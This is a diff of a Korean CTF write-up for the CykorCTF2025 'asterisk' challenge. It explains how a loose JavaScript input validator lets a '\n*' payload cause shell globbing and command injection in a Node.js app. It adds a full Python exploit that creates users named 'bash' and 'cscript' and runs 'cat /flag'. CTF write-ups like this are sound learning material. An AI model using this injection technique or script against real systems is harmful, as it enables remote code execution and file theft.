@@ -57,6 +57,14 @@ C:.
 </div>
 </details>
 
+<div class="box-warning">
+💡 <strong>전체 로드맵</strong><br>
+<figure style="text-align: center;">
+    <img src="/assets/images/2025-12-10/KakaoTalk_20251210_022210403.jpg" alt="CykorCTF2025-asterisk 풀이 전체 로드맵">
+    <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">CykorCTF2025-asterisk 풀이 전체 로드맵</figcaption>
+</figure>
+</div>
+
 ---
 
 ## <span class="highlight-blue">1. 👀 static analysis</span>
@@ -166,7 +174,7 @@ index.js 안에서의 <span class =  "text-bold text-orange">데이터 흐름의
         <figcaption style="font-size: 0.9em; color:
         gray; margin-top: 5px;">submit handler vs judge-all handler</figcaption>
     </figure>
-    따라서 아래와 같은 경우 submit handler가 취약할 수 있음을 이해할 수 있다.
+    따라서 위와 같은 경우 submit handler가 취약할 수 있음을 이해할 수 있다.
     
 3. <span class="highlight-yellow">**submit handler에서 통과하는 shell이 하는 동작 관찰하기**</span><br>
     <code>const shell = `echo ${input} | node ../bin/mini-run.js --b64code '${b64code}'`;</code>에 '\n*'를 넘기게 되면,
@@ -190,11 +198,12 @@ index.js 안에서의 <span class =  "text-bold text-orange">데이터 흐름의
     같은 원리로 <code>bash cscript</code>와 같은 명령어도 실행할 수 있다. 다시금 쉘 프로그램을 실행하여 미리 만들어둔 바이너리를 실행할 수 있는 것이다(cat ./flag.txt)<br>
     <span class="text-red text-bold text-italic">⇨ 입력 검증값 우회, shell injection ⇨ RCE🚨</span>
 
-4. <span class="highlight-yellow">**shell을 만들 때 쓰이는 input을 거꾸로 따라가기; runWithEchoPipeline 함수의 validateTestInput**</span><br>
+4. <span class="highlight-yellow">**shell을 만들 때 쓰이는 input을 거꾸로 따라가기; runWithEchoPipeline 함수의** </span><span class="highlight-yellow text-blue">**validateTestInput**</span><br>
    
-    한편, 이렇게 runWithEchoPipeline에서 초기화된 input 변수가 shell injection에 중요한 역할을 한다는 것을 알게된 시점에서, input 값에 대한 filtering 조건이 없는지 확인해봐야한다.
+    이렇게 runWithEchoPipeline에서 초기화된 <span class = "text-red text-bold text-italic">input 변수</span>가 shell injection에 **중요한 역할**을 한다는 것을 알게되었으므로, <span class = "text-red text-bold text-italic">input 값에 대한 filtering 조건</span> 이 있는지 확인해봐야한다.
     
     <div class="box-danger" markdown = "1">
+    <span class = "highlight-red"><strong>💡 NOTE</strong></span><br>
     **submit 발생 > runWithEchoPipeline > <span class = "text-bold text-red">!!</span> > shell 실행** <br>
     으로 이어지는데, 
     <figure style="text-align: center;">
@@ -202,15 +211,16 @@ index.js 안에서의 <span class =  "text-bold text-orange">데이터 흐름의
         <figcaption style="font-size: 0.9em; color:
         gray; margin-top: 5px;">runWithEchoPipeline의 흐름</figcaption>
     </figure>
-    이 때 validateTestInput이 filter 역할을 한다.
-    </div>
-
+    이 때 **validateTestInput이** <span class = "text-orange">**filter 역할**</span>을 한다.
     <figure style="text-align: center;">
         <img src="/assets/images/2025-12-09/20251209_015751.png" alt="validateTestInput의 정의">
         <figcaption style="font-size: 0.9em; color:
         gray; margin-top: 5px;">validateTestInput의 정의</figcaption>
     </figure>
+    </div>
     
+    validateTestInput의 정의 부분은 다음과 같이 구현되어있다.(index.js)
+
     ```javascript
     function validateTestInput(inp) {
         // 1. 타입 검사: 입력값이 문자열이 아니면 차단
@@ -221,7 +231,7 @@ index.js 안에서의 <span class =  "text-bold text-orange">데이터 흐름의
         if (inp.length < 1 || inp.length > 2) return false;
 
         // 3. 비교 기준값 1 설정 (숫자)
-        // [!] check 변수에 문자열 "0"이 아니라, 숫자(Number) 0을 할당했습니다.
+        // [!] check 변수에 문자열 "0"이 아니라, 숫자(Number) 0을 할당
         const check = 0;
 
         // 4. 비교 기준값 2 설정 (문자열)
@@ -238,24 +248,69 @@ index.js 안에서의 <span class =  "text-bold text-orange">데이터 흐름의
         return true;
     }
     ```
-    자바스크립트에서 문자열과 숫자를 비교할 때, 자바스크립트 엔진은 문자열을 **숫자로 강제 변환(Type Coercion)**하여 비교한다. 일반적인 문자 'a', 'z' 등은 Number('a')가 NaN이 되어 NaN >= 0은 false가 되지만, **공백 문자( )**나 **개행 문자(\n, \t)**는 숫자로 변환하면 **0**이 되므로, 줄바꿈 등 Shell injection에 치명적인 문자들을 허용해주게 된다.
+    구조는 아래 설명과 같다.
 
-    한편 두 condition 중 어느것 하나만 만족하면 되기 때문에, 후자도 관찰해보면 바로 ASCII 코드 상에서 "9"보다 작으면(ASCII 코드값 0x57) 통과된 다는 것이다. 이 두개의 느슨한 명제 때문에 아래가 가능하다
-    아스키 57보다 작은 문자들: ! (33), " (34), # (35), $, %, &, ', (, ), * (42), +, ,, -, ., /.
+    자바스크립트에서 문자열과 숫자를 비교할 때, 자바스크립트 엔진은 문자열을 **숫자로 강제 변환(Type Coercion)**하여 비교한다. <span class="text-red">일반적인 문자 'a', 'z' 등은 Number('a')가 NaN이 되어 NaN >= 0은 false가 되지만, <span class="highlight-yellow">**공백 문자( )**나 **개행 문자(\n, \t)**는 숫자로 변환하면 **0**</span>이 되므로, 줄바꿈 등 <span class="highlight-yellow text-italic">Shell injection에 치명적인 문자들을 허용</span></span>해주게 된다.
 
-그렇다면 이제 '1-2. shell을 만들 때 쓰이는 input을 거꾸로 따라가기'에서 확인한 submit handler가 input으로 뭘 가져오는 것인지 확인해보자.
+    한편 두 condition 중 어느것 하나만 만족하면 되기 때문에, 후자도 관찰해보면 바로 ASCII 코드 상에서 "9"보다 작으면(ASCII 코드값 0x57) 통과된 다는 것이다. 이 두개의 느슨한 명제 때문에 아래가 가능하다<br>
+    <span class="text-orange">**아스키 57보다 작은 문자들**</span>: ! (33), " (34), # (35), $, %, &, ', (, ), * (42), +, ,, -, ., /.<br>
 
-<figure style="text-align: center;">
-        <img src="/assets/images/2025-12-09/20251208_215916.png" alt="server/public/*.html에서 submit handler 참조 확인하기">
-        <figcaption style="font-size: 0.9em; color:
-        gray; margin-top: 5px;">server/public/*.html에서 submit handler 참조 확인하기</figcaption>
-</figure>
+    <figure style="text-align: center;">
+    <img src="/assets/images/2025-12-10/KakaoTalk_20251210_003426829.jpg" alt="validateTestInput의 작동 개요">
+    <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">validateTestInput의 작동 개요</figcaption>  
+    </figure>
 
-<figure style="text-align: center;">
-        <img src="/assets/images/2025-12-09/20251208_220322.png" alt="app.html에서 submit handler 호출 확인하기">
-        <figcaption style="font-size: 0.9em; color:
-        gray; margin-top: 5px;">app.html에서 submit handler 호출 확인하기</figcaption>
-</figure>
+5. **Globbing attack을 통한 shell injection을 가능하게 하기 위한 <span class="text-red text-bold">파일 생성 gadget</span> 찾기**<br>
+
+    우리는 이제껏 index.js의 submit 핸들러를 트리거 -- 즉, login.html에서 로그인 성공 후 접근 가능한 app.html의 code 컴포넌트에 validateTestInput 조건에 맞는 값을 입력<span class="text-gray text-italic">(아래 3. Dynamic Analysis with Docker에 기술)</span> -- 함으로써 시스템 장악 == <span class="highlight-yellow">**Globbing attack을 통한 shell injection이 가능**</span>함을 관찰했다.
+
+    그러나 이 때 중요한 지점은, validateTestInput의 검증에 의해(1-4 기술 참고) 파일 생성 Gadget이 필수란 것이다.
+    <figure style="text-align: center;">
+        <img src="/assets/images/2025-12-10/20251210_013746.png" alt="index.js에서 WriteFile 함수 호출 부분 찾기">
+        <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">index.js에서 WriteFile 함수 호출 부분 찾기</figcaption>
+    </figure>
+    
+    - <span class="highlight-yellow text-orange text-bold">Globbing attack의 요구사항</span>: 파일 생성 가능 / 파일 이름, 내용 커스텀 가능
+      - <span class="text-red text-bold highlight-green">writeUsers</span>: 파일 이름이 <span class="text-orange text-bold">고정됨</span> (USERS_DB), 파일 내용은 json 형식으로 <span class="text-orange text-bold">실행할 수 없음</span>. ❌
+      - <span class="text-red text-bold highlight-green">saveUserCodeToBin</span>: 파일 이름은 <span class="text-green text-bold">username</span>, 파일 내용은 <span class="text-green text-bold">code</span>로 모두 커스텀 가능 💯
+    
+    따라서 Globbing이 가능한 saveUserCodeToBin을 참조하고 있는 지점을 아래 두 사진과 같이 따라가 보자. 
+
+    <div style="display: flex; gap: 10px; align-items: center;">
+        <figure style="text-align: center;">
+            <img src="/assets/images/2025-12-10/20251210_014059.png" alt="saveUserCodeToBin의 참조 지점(1)" style="max-height: 50vh; width: auto;">
+            <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">saveUserCodeToBin의 참조 지점(1)</figcaption>
+        </figure> 
+        <figure style="text-align: center;">
+            <img src="/assets/images/2025-12-10/20251210_014328.png" alt="참조 지점(2), (3)" style="max-height: 50vh; width: auto;">
+            <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">참조 지점(2), (3)</figcaption>
+        </figure>
+    </div>
+    /judge-all은 앞선 정적분석에서 사용하지 않을 것으로 이미 판단했기 때문에, /submit과 /save에서 파일 저장을 트리거할 수 있단 것을 염두에 두어야한다. 
+
+6. **submit handler와 save handler의 위치 파악**
+
+    <figure style="text-align: center;">
+            <img src="/assets/images/2025-12-09/20251208_215916.png" alt="server/public/*.html에서 submit handler 참조 확인하기">
+            <figcaption style="font-size: 0.9em; color:
+            gray; margin-top: 5px;">server/public/*.html에서 submit handler 참조 확인하기</figcaption>
+    </figure>
+
+    <figure style="text-align: center;">
+            <img src="/assets/images/2025-12-09/20251208_220322.png" alt="app.html에서 submit handler 호출 확인하기">
+            <figcaption style="font-size: 0.9em; color:
+            gray; margin-top: 5px;">app.html에서 submit handler 호출 확인하기</figcaption>
+    </figure>
+
+    <figure style="text-align: center;">
+        <img src="/assets/images/2025-12-10/20251210_020151.png" alt="server/public/*html에서 save handler 참조 확인하기">
+        <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">server/public/*html에서 save handler 참조 확인하기</figcaption>
+    </figure>
+
+    <figure style="text-align: center;">
+        <img src="/assets/images/2025-12-10/20251210_020234.png" alt="app.html에서 save hanlder 호출 확인하기">
+        <figcaption style="font-size: 0.9em; color: gray; margin-top: 5px;">app.html에서 save hanlder 호출 확인하기</figcaption>
+    </figure>
 
 정확히 어떤 POST 요청에 대해 어떤 값이 날라가는지는 docker setting 후 개발자 도구에서 관찰할 수 있다.
 
@@ -364,3 +419,88 @@ submit handler는 $('#submit')이 눌릴 때 트리거된다.
 ---
 
 ## <span class="highlight-blue">4. exploit 작성</span>
+
+<details>
+<summary><span class = "text-bold highlight-purple">🎮Exploit Code🎮</span></summary>
+<div class="toggle-content" markdown="1">
+
+```python
+    import requests
+    import json
+    import sys
+
+    # [중요] 문제 서버 URL (맨 뒤 슬래시 '/' 제거 필수)
+    # 예: http://54.180.15.185:8080/play/Qm...
+    TARGET_URL = "http://54.180.15.185:8080/play/Qm44xPxHsE1bZUtoO7ZDq0zDCexLiwGT"
+
+    def register_and_save(s, username, code):
+        # 1. Signup
+        print(f"[*] Registering user: {username}")
+        r = s.post(f"{TARGET_URL}/signup", json={"username": username, "password": "password123"})
+        
+        if "Username already exists" in r.text:
+            print(f"    User {username} exists, trying to login...")
+        
+        # 2. Login
+        r = s.post(f"{TARGET_URL}/login", json={"username": username, "password": "password123"})
+        
+        # 에러 체크 강화
+        if not r.json().get("ok"):
+            print(f"[-] Login failed for {username}")
+            print(f"[-] Server Error: {r.text}")
+            sys.exit(1)
+            
+        # 3. Save Code
+        print(f"[*] Saving payload to {username}...")
+        r = s.post(f"{TARGET_URL}/save", json={"code": code})
+        if not r.json().get("ok"):
+            print(f"[-] Save failed: {r.text}")
+            sys.exit(1)
+
+    def exploit():
+        s = requests.Session()
+        
+        # [수정됨] 유저 이름에서 밑줄(_) 제거!
+        
+        # Step 1: 'bash' (명령어)
+        register_and_save(s, "bash", "dummy")
+        
+        # Step 2: 'cscript' (실행할 스크립트 파일)
+        # 내용: 플래그 파일 읽기
+        register_and_save(s, "cscript", "cat /flag")
+        
+        # Step 3: 'ztrigger' (공격 트리거용 유저)
+        # 출력 많이 하기
+        trigger_code = "\n".join(["input s", "print s"] * 10)
+        
+        print(f"[*] Registering trigger user...")
+        # 여기도 이름 변경: z_trigger -> ztrigger
+        r = s.post(f"{TARGET_URL}/signup", json={"username": "ztrigger", "password": "password123"})
+        s.post(f"{TARGET_URL}/login", json={"username": "ztrigger", "password": "password123"})
+        
+        # Step 4: 공격 실행
+        # '\n*' -> 쉘 확장 -> bash cscript users.json ztrigger ...
+        print("[*] Sending exploit payload...")
+        r = s.post(f"{TARGET_URL}/submit", json={
+            "code": trigger_code,
+            "input": "\n*" 
+        })
+        
+        response = r.json()
+        stdout = response.get("stdout", "")
+        
+        print("\n" + "="*20 + " FULL OUTPUT " + "="*20)
+        print(stdout)
+        print("="*53 + "\n")
+        
+        if "CyKor{" in stdout:
+            print(f"[+] SUCCESS! Flag found in output.")
+        else:
+            print("[-] Flag not found immediately. Check the FULL OUTPUT above.")
+
+    if __name__ == "__main__":
+        exploit()
+```
+
+</div>
+</details>
